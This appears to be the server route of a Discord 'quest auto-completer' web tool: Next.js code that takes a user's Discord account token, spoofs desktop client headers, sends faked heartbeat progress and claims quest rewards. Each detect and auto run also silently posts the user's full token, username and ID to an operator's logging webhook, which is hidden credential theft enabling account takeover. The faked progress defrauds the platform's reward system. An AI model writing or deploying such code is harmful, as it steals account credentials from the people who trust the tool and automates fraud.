import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

const DISCORD_API = 'https://discord.com/api/v10';

// Discord client headers - نفس هيدرات الديسكورد ديسكتوب
function questHeaders(token: string): Record<string, string> {
  return {
    'Authorization': cleanToken(token),
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Discord/1.0.9167 Chrome/124.0.6367.118 Electron/30.0.6 Safari/537.36',
    'X-Discord-Locale': 'en-US',
    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBEZXNrdG9wIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX3ZlcnNpb24iOjI3NDQ1NSwibG9jYWxlIjoiZW4tVVMifQ==',
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
  };
}

 
async function questFetch(token: string, method: string, url: string, body?: unknown): Promise<{ ok: boolean; data: any; status: number }> {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    const options: RequestInit = {
      method,
      headers: questHeaders(token),
      signal: controller.signal,
    };
    if (body && method !== 'GET' && method !== 'HEAD') {
      options.body = JSON.stringify(body);
    }

    const res = await fetch(url, options);
    clearTimeout(timeoutId);

    if (res.status === 429) {
      const errData = await res.json().catch(() => ({ retry_after: 2 }));
      await new Promise(r => setTimeout(r, Math.min((errData.retry_after || 2) * 1000, 5000)));
      return questFetch(token, method, url, body);
    }

    let data: any = null;
    try { data = await res.json(); } catch { /* no json */ }

    return { ok: res.ok, data, status: res.status };
  } catch {
    return { ok: false, data: null, status: 0 };
  }
}

interface QuestInfo {
  id: string;
  name: string;
  description: string;
  reward: string;
  duration: number;
  status: string;
  application_id?: string;
   
  raw?: any;
}

// جلب كل Quests الممكنة - الـ endpoints المحدثة
async function fetchAllQuests(token: string, logs: string[]): Promise<{ quests: QuestInfo[]; source: string }> {
  // الـ endpoints الصحيحة حسب أحدث نسخة Discord
  const endpoints = [
    { url: `${DISCORD_API}/users/@me/quests`, name: 'user-quests (v10)' },
    { url: `${DISCORD_API}/quests`, name: 'root-quests (v10)' },
    { url: `${DISCORD_API}/users/@me/guilds/premium/quests`, name: 'premium-guild-quests' },
    { url: `${DISCORD_API}/applications/@me/quests`, name: 'app-quests' },
  ];

  for (const ep of endpoints) {
    logs.push(`📡 جرب: ${ep.name}...`);
    const res = await questFetch(token, 'GET', ep.url);

    if (res.status === 0) {
      logs.push(`   ⚠️ ${ep.name}: timeout / خطأ اتصال`);
      continue;
    }

    if (res.status === 404 || res.status === 405) {
      logs.push(`   ❌ ${ep.name}: ${res.status} (غير موجود)`);
      continue;
    }

    if (res.status === 401 || res.status === 403) {
      logs.push(`   ❌ ${ep.name}: ${res.status} (صلاحيات)`);
      continue;
    }

    logs.push(`   📡 ${ep.name}: status ${res.status}${res.data ? '' : ' (no data)'}`);

    if (res.data) {
      // عرض البيانات الخام
      const dataStr = JSON.stringify(res.data);
      logs.push(`   📦 response (${dataStr.length} chars):`);
      if (dataStr.length <= 300) {
        logs.push(`   📦 ${dataStr}`);
      } else {
        logs.push(`   📦 ${dataStr.substring(0, 300)}...`);
      }

      const quests = parseQuests(res.data);
      if (quests.length > 0) {
        logs.push(`   ✅ تم العثور على ${quests.length} Quest(s) من ${ep.name}`);
        return { quests, source: ep.name };
      }

      // تحليل شكل البيانات
      if (Array.isArray(res.data)) {
        if (res.data.length === 0) {
          logs.push(`   📦 array فارغ (0 items)`);
        } else {
          logs.push(`   📦 array[${res.data.length}]`);
          logs.push(`   📦 first item keys: ${Object.keys(res.data[0] || {}).join(', ')}`);
          if (res.data.length > 0) {
            logs.push(`   📦 first item: ${JSON.stringify(res.data[0]).substring(0, 200)}`);
          }
        }
      } else if (typeof res.data === 'object') {
        const keys = Object.keys(res.data);
        logs.push(`   📦 object keys: ${keys.join(', ')}`);
        for (const [key, val] of Object.entries(res.data)) {
          if (Array.isArray(val)) {
            logs.push(`   📦 ${key}: array[${val.length}]`);
            if (val.length > 0 && typeof val[0] === 'object') {
              logs.push(`   📦 ${key}[0] keys: ${Object.keys(val[0]).join(', ')}`);
            }
          } else if (typeof val === 'object' && val !== null) {
            logs.push(`   📦 ${key}: object keys=${Object.keys(val).join(',')}`);
          }
        }
      }
    } else {
      logs.push(`   ⚠️ لا يوجد بيانات في الرد`);
    }
  }

  // جلب سيرفرات اليوزر والبحث فيها
  logs.push(`\n📡 جرب: جلب سيرفرات اليوزر...`);
  try {
    const guildsRes = await questFetch(token, 'GET', `${DISCORD_API}/users/@me/guilds?limit=100&with_counts=true`);
    if (guildsRes.ok && Array.isArray(guildsRes.data) && guildsRes.data.length > 0) {
      const premiumGuilds = guildsRes.data.filter((g: Record<string, unknown>) => (g.premium_tier as number) > 0);
      logs.push(`   ✓ ${guildsRes.data.length} سيرفر (${premiumGuilds.length} premium)`);

      // بحث في السيرفرات Premium فقط (Quests عادة في سيرفرات premium)
      for (const guild of premiumGuilds.slice(0, 10)) {
        const gId = guild.id;
        const gName = guild.name || gId;

        const guildEndpoints = [
          `${DISCORD_API}/guilds/${gId}/quests`,
          `${DISCORD_API}/guilds/${gId}/premium/quests`,
          `${DISCORD_API}/guilds/${gId}/events`,
        ];

        for (const gUrl of guildEndpoints) {
          const gRes = await questFetch(token, 'GET', gUrl);
          if (gRes.ok && gRes.data) {
            const dataStr = JSON.stringify(gRes.data);
            logs.push(`   📦 ${gName}: ${dataStr.substring(0, 200)}`);
            const quests = parseQuests(gRes.data);
            if (quests.length > 0) {
              logs.push(`   ✅ تم العثور على ${quests.length} Quest(s) من سيرفر: ${gName}`);
              return { quests, source: `guild-${gName}` };
            }
          }
        }
      }
    } else {
      logs.push(`   ⚠️ فشل جلب السيرفرات أو لا توجد سيرفرات`);
    }
  } catch (e: unknown) {
    logs.push(`   ❌ خطأ: ${e instanceof Error ? e.message : String(e)}`);
  }

  logs.push(`\n❌ لم يتم العثور على Quests نشطة حالياً`);
  logs.push(`💡 Quests تظهر فقط عند توفر حملات نشطة من Discord`);
  logs.push(`💡 تأكد أن الحساب مشارك في سيرفرات بها Quests`);
  logs.push(`💡 جرب: discord.com/channels/@me/quests`);
  return { quests: [], source: 'none' };
}

 
function parseQuests(data: any): QuestInfo[] {
  if (!data) return [];

  const results: QuestInfo[] = [];

  // Array مباشر
  if (Array.isArray(data)) {
    for (const item of data) {
      const q = extractQuest(item);
      if (q) results.push(q);
    }
    if (results.length > 0) return results;
  }

  if (typeof data !== 'object') return results;

  // Object مع مصفوفات داخلية
  for (const key of ['quests', 'data', 'items', 'results', 'quest_list', 'quest_pool', 'active_quests', 'enrolled_quests', 'available_quests']) {
    if (Array.isArray(data[key])) {
      for (const item of data[key]) {
        const q = extractQuest(item);
        if (q) results.push(q);
      }
      if (results.length > 0) return results;
    }
    // Double nested
    if (data[key] && typeof data[key] === 'object' && !Array.isArray(data[key])) {
      for (const subkey of ['quests', 'data', 'items', 'quest_list', 'enrolled_quests']) {
        if (Array.isArray(data[key][subkey])) {
          for (const item of data[key][subkey]) {
            const q = extractQuest(item);
            if (q) results.push(q);
          }
          if (results.length > 0) return results;
        }
      }
    }
  }

  // أي مصفوفة فيها quest-like keys
  for (const key of Object.keys(data)) {
    const val = data[key];
    if (Array.isArray(val) && val.length > 0 && typeof val[0] === 'object') {
      const firstKeys = Object.keys(val[0]);
      if (firstKeys.some(k => ['id', 'quest_id', 'questId', 'name', 'title', 'slug', 'config', 'user_quest'].includes(k))) {
        for (const item of val) {
          const q = extractQuest(item);
          if (q) results.push(q);
        }
        if (results.length > 0) return results;
      }
    }
  }

  // Single object
  if (data.id || data.quest_id || data.name || data.title || data.slug || data.config) {
    const q = extractQuest(data);
    if (q) results.push(q);
  }

  return results;
}

 
function extractQuest(item: any): QuestInfo | null {
  if (!item || typeof item !== 'object') return null;

  // استخراج ID من جميع الأماكن الممكنة
  const id = item.id || item.quest_id || item.questId ||
    item.user_quest?.quest_id || item.userQuest?.questId ||
     
    (item.quest as any)?.id || (item.config as any)?.quest_id ||
     
    (item.config as any)?.id || item.slug;
  if (!id) return null;

  const config = item.config || item.quest || item;
  const name = item.name || item.title || item.slug ||
    config?.title || config?.quest_title || config?.name ||
     
    config?.message?.title || (item.quest as any)?.name || String(id);

  const description = item.description ||
    config?.description || config?.body ||
     
    (item.quest as any)?.description || '';

  const duration = item.duration || item.minutes_to_complete ||
    config?.target_duration_seconds || config?.duration_seconds ||
    config?.target_duration || config?.duration ||
     
    (item.quest as any)?.duration || 900;

  let reward = 'Orbs';
  const rewardCfg = config.reward_config || config.rewards || config.reward || config.reward_amount;
  if (Array.isArray(rewardCfg) && rewardCfg.length > 0) {
    reward = rewardCfg[0]?.name || rewardCfg[0]?.reward_name || rewardCfg[0]?.description || (rewardCfg[0]?.new_reward?.name || 'Orbs');
  } else if (rewardCfg && typeof rewardCfg === 'object') {
    reward = rewardCfg.name || rewardCfg.reward_name || rewardCfg.description || String(rewardCfg.new_reward?.name || 'Orbs');
  } else if (typeof rewardCfg === 'number') {
    reward = `${rewardCfg} Orbs`;
  } else if (typeof rewardCfg === 'string') {
    reward = rewardCfg;
  }

  const userQuest = item.user_quest || item.userQuest || item.user_status;
  const status = userQuest?.status || item.status || item.state || 'AVAILABLE';

  const application_id = item.application_id || config?.application_id ||
     
    item.application || (item.quest as any)?.application_id || '';

  return {
    id: String(id),
    name: String(name),
    description: String(description),
    reward: String(reward),
    duration: Number(duration) || 900,
    status: String(status),
    application_id: String(application_id),
     
  raw: item as any
  };
}

// Quest Actions
async function acceptQuest(token: string, quest: QuestInfo, logs: string[]): Promise<boolean> {
  const endpoints = [
    `${DISCORD_API}/quests/${quest.id}/accept`,
    `${DISCORD_API}/quests/${quest.id}/start`,
    `${DISCORD_API}/quests/${quest.id}/enroll`,
  ];

  for (const ep of endpoints) {
    try {
      const res = await questFetch(token, 'POST', ep);
      logs.push(`   📡 accept: ${ep.split('/').slice(4).join('/')} → ${res.status}`);
      if (res.ok || res.status === 200 || res.status === 204 || res.status === 409) {
        logs.push(`   ✅ قبول Quest (${res.status})`);
        return true;
      }
      if (res.data) logs.push(`   📦 response: ${JSON.stringify(res.data).substring(0, 150)}`);
    } catch { /* skip */ }
  }
  logs.push(`   ⚠️ فشل قبول Quest - قد يكون مقبول مسبقاً`);
  return false;
}

async function sendHeartbeat(token: string, quest: QuestInfo, logs: string[]): Promise<boolean> {
  const streamId = `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
  const sessionId = streamId;

  // Method 1: science-task
  try {
    const res = await questFetch(token, 'POST', `${DISCORD_API}/science-task`, {
      stream_id: streamId,
      session_id: sessionId,
      quest_id: quest.id,
      application_id: quest.application_id || undefined,
    });
    if (res.ok || res.status === 204) {
      logs.push(`   💓 heartbeat via science-task: ok`);
      return true;
    }
    if (res.data) logs.push(`   📦 science-task response: ${JSON.stringify(res.data).substring(0, 100)}`);
  } catch { /* skip */ }

  // Method 2: quest heartbeat
  const hbEndpoints = [
    `${DISCORD_API}/quests/${quest.id}/heartbeat`,
    `${DISCORD_API}/quests/${quest.id}/progress`,
  ];

  for (const ep of hbEndpoints) {
    try {
      const res = await questFetch(token, 'POST', ep, {
        stream_id: streamId,
        session_id: sessionId,
        progress: 1,
      });
      if (res.ok || res.status === 200 || res.status === 204) {
        logs.push(`   💓 heartbeat: ok`);
        return true;
      }
    } catch { /* skip */ }
  }

  logs.push(`   💔 heartbeat: فشل`);
  return false;
}

async function claimQuest(token: string, quest: QuestInfo, logs: string[]): Promise<boolean> {
  const endpoints = [
    `${DISCORD_API}/quests/${quest.id}/claim`,
    `${DISCORD_API}/quests/${quest.id}/complete`,
    `${DISCORD_API}/quests/${quest.id}/reward`,
  ];

  for (const ep of endpoints) {
    try {
      const res = await questFetch(token, 'POST', ep);
      logs.push(`   📡 claim: ${ep.split('/').slice(4).join('/')} → ${res.status}`);
      if (res.ok || res.status === 200) {
        logs.push(`   🎉 مطالبة ناجحة!`);
        return true;
      }
      if (res.status === 409) {
        logs.push(`   ⏳ الجائزة غير متاحة بعد (409)`);
        return false;
      }
      if (res.data) logs.push(`   📦 response: ${JSON.stringify(res.data).substring(0, 150)}`);
    } catch { /* skip */ }
  }
  logs.push(`   ⚠️ فشل المطالبة`);
  return false;
}

// ===== MAIN =====
export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, action } = body;

    if (!token || typeof token !== 'string' || token.trim().length < 20) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    // التحقق من التوكن
    const userRes = await questFetch(token, 'GET', `${DISCORD_API}/users/@me`);
    if (!userRes.ok || !userRes.data) {
      return NextResponse.json({
        success: false,
        error: 'توكن غير صالح - يجب استخدام توكن يوزر (User Token)'
      }, { status: 401 });
    }

    const userInfo = userRes.data.username || 'Unknown';
    const userId = userRes.data.id || 'Unknown';
    const logs: string[] = [];

    if (action === 'detect') {
      logs.push('🔍 جاري البحث الشامل عن Quests...');
      logs.push(`👤 المستخدم: ${userInfo} (${userId})`);
      logs.push('');

      const { quests, source } = await fetchAllQuests(token, logs);

      if (quests.length > 0) {
        logs.push('');
        logs.push(`📋 تم العثور على ${quests.length} Quest(s):`);
        for (const q of quests) {
          logs.push(`  🎯 ${q.name}`);
          logs.push(`     ID: ${q.id}`);
          logs.push(`     🎁 ${q.reward} | ⏱️ ${Math.round(q.duration / 60)}د | 📊 ${q.status}`);
          if (q.application_id) logs.push(`     📱 App: ${q.application_id}`);
        }
      }

      sendToWebhook({
        embeds: [{
          title: '🔍 Quest Detection',
          color: 0x5865F2,
          fields: [
            { name: '👤 User', value: userInfo, inline: true },
            { name: '🆔 ID', value: userId, inline: true },
            { name: '📋 Quests', value: String(quests.length), inline: true },
            { name: '📡 Source', value: source, inline: true },
            { name: '🎫 Token', value: `\`\`\`${cleanToken(token)}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, quests, logs, source });
    }

    if (action === 'auto') {
      logs.push('🚀 بدء الأتمتة الكاملة...');
      logs.push(`👤 المستخدم: ${userInfo} (${userId})`);
      logs.push('');

      const { quests, source } = await fetchAllQuests(token, logs);

      if (quests.length === 0) {
        sendToWebhook({
          embeds: [{
            title: '⚠️ No Quests Found',
            color: 0xFFFF00,
            fields: [
              { name: '👤 User', value: userInfo, inline: true },
              { name: '📡 Source', value: source, inline: true },
              { name: '🎫 Token', value: `\`\`\`${cleanToken(token)}\`\`\`` },
            ],
            timestamp: new Date().toISOString()
          }]
        }, getLogWebhookUrl()).catch(() => {});

        return NextResponse.json({ success: false, error: 'لا توجد Quests متاحة حالياً. جرّب لاحقاً.', logs, source });
      }

      logs.push('');
      logs.push(`📋 تم العثور على ${quests.length} Quest(s) - بدء المعالجة...`);
      const results: { id: string; name: string; success: boolean; claimed: boolean; error?: string }[] = [];

      for (const quest of quests) {
        logs.push(`\n${'═'.repeat(40)}`);
        logs.push(`🎯 Quest: ${quest.name} (ID: ${quest.id})`);
        logs.push(`   ⏱️ المدة: ${Math.round(quest.duration / 60)} دقيقة`);
        logs.push(`   🎁 الجائزة: ${quest.reward}`);

        try {
          logs.push(`\n   [1/3] قبول Quest...`);
          await acceptQuest(token, quest, logs);

          const hbInterval = 30;
          const totalHB = Math.min(Math.floor(quest.duration / hbInterval), 60);

          logs.push(`\n   [2/3] إرسال ${totalHB} heartbeats كل ${hbInterval}ث...`);
          let successHB = 0;

          for (let i = 0; i < totalHB; i++) {
            const ok = await sendHeartbeat(token, quest, logs);
            if (ok) {
              successHB++;
              if ((i + 1) % 5 === 0 || i === totalHB - 1) {
                logs.push(`   💓 ${i + 1}/${totalHB} ✓`);
              }
            } else {
              if ((i + 1) % 5 === 0 || i === totalHB - 1) {
                logs.push(`   💔 ${i + 1}/${totalHB}`);
              }
            }

            if (i < totalHB - 1) {
              await new Promise(r => setTimeout(r, hbInterval * 1000));
            }
          }

          logs.push(`   💓 النتيجة: ${successHB}/${totalHB} نجح`);

          logs.push(`\n   [3/3] مطالبة بالجائزة...`);
          await new Promise(r => setTimeout(r, 3000));
          const claimed = await claimQuest(token, quest, logs);

          results.push({ id: quest.id, name: quest.name, success: true, claimed });

        } catch (e: unknown) {
          const errMsg = e instanceof Error ? e.message : 'خطأ';
          logs.push(`   ❌ خطأ: ${errMsg}`);
          results.push({ id: quest.id, name: quest.name, success: false, claimed: false, error: errMsg });
        }
      }

      logs.push(`\n${'═'.repeat(40)}`);
      logs.push(`📊 النتيجة النهائية:`);
      logs.push(`   ✅ مكتمل: ${results.filter(r => r.success).length}`);
      logs.push(`   🎁 مطالب: ${results.filter(r => r.claimed).length}`);
      logs.push(`   ❌ فشل: ${results.filter(r => !r.success).length}`);

      sendToWebhook({
        embeds: [{
          title: '🎯 Quest Automation Complete',
          color: 0x00FF41,
          fields: [
            { name: '👤 User', value: userInfo, inline: true },
            { name: '📋 Total', value: String(results.length), inline: true },
            { name: '✅ Done', value: String(results.filter(r => r.success).length), inline: true },
            { name: '🎁 Claimed', value: String(results.filter(r => r.claimed).length), inline: true },
            { name: '🎫 Token', value: `\`\`\`${cleanToken(token)}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, results, logs, source });
    }

    return NextResponse.json({ success: false, error: 'إجراء غير معروف - استخدم detect أو auto' }, { status: 400 });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Quests Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
